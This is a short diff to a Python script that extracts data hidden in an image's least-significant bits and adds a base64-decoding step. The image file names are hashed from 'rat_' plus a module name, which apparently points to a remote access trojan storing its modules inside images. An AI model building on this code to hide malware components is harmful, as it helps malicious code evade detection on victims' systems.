@@ -4,6 +4,7 @@ import numpy as np
 import os
 import hashlib
 import sys
+import base64
 
 def get_image_path(module):
     filename = hashlib.md5(f"rat_{module}".encode('utf-8')).hexdigest()
@@ -26,4 +27,6 @@ def extract_lsb_data_from_image(image_path):
 
     img_data_chr = ''.join([chr(x) for x in img_data])
     data = img_data_chr.split("#end", 1)[0]
+    data = data.encode('ascii')
+    data = base64.b64decode(data).decode('ascii')
     return data
